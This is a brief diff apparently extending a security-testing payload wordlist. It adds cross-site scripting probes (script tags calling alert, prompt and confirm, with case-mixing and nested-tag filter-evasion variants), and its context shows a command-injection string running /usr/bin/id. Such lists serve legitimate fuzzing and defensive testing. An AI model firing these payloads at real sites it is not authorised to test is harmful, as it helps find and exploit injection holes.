@@ -345,3 +345,12 @@ $;/usr/bin/id
 ((
 )
 (
+<Script> alert (1); </ script>
+<Script> prompt (1); </ script>
+<Script> confirm (1); </ script>
+<ScRiPt> alert (1); </ scrIPt>
+<Scr <script> ipt> alert (1) </ scr <script> ipt>
+<Scr <script> ipt> alert (1) </ scr <script> ipt>
+<Script>
+Var x = ""; alert (1) //
+</ Script>
